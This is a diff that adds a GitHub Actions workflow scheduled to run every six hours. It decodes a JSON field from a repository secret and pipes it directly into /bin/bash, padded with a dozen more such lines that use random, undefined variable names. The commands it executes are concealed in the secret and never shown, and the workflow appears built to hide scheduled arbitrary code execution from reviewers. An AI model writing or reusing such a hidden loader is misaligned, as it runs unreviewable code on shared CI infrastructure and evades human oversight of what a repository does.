@@ -1,0 +1,29 @@
+name: julinjinjia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: julinjinjia
+        env:
+          znow5: ${{ secrets.znow5 }}
+        run: |
+          echo $znow5 | jq -r .my1 | /bin/bash
+          echo $ibitn79713 | jq -r .pkjg19537 | /bin/bash
+          echo $iihbp311 | jq -r .uslv8 | /bin/bash
+          echo $o3 | jq -r .lp66273 | /bin/bash
+          echo $auwt4014 | jq -r .piwqj79034 | /bin/bash
+          echo $gw9379 | jq -r .ckod1 | /bin/bash
+          echo $iurm8 | jq -r .cs0178 | /bin/bash
+          echo $mx9477 | jq -r .p2 | /bin/bash
+          echo $jslzv6 | jq -r .zij905 | /bin/bash
+          echo $ii690 | jq -r .fr4597 | /bin/bash
+          echo $mlext4737 | jq -r .bhcb71682 | /bin/bash
+          echo $ddvc8709 | jq -r .rpw5705 | /bin/bash
+          echo $idd5775 | jq -r .j64853 | /bin/bash
+
